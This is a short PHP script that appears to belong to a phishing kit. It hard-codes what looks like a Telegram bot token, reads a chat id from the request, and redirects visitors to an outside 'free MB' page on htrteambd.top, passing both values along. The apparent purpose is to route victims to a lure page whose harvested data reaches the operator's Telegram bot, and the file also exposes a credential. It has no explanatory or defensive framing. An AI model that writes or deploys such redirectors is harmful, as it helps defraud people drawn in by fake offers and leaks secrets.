<?php
// @REDX_64
$botToken = "8387602128:AAFFKheqzkfGT7N9tUHThxKXXLMbVa_ktTY.";
 $chatId = $_REQUEST["8387602128:AAFFKheqzkfGT7N9tUHThxKXXLMbVa_ktTY"];

$link = "https://htrteambd.top/tnl/freemb.php?botToken=$botToken&id=$chatId";

header("Location: $link");
exit();
?>
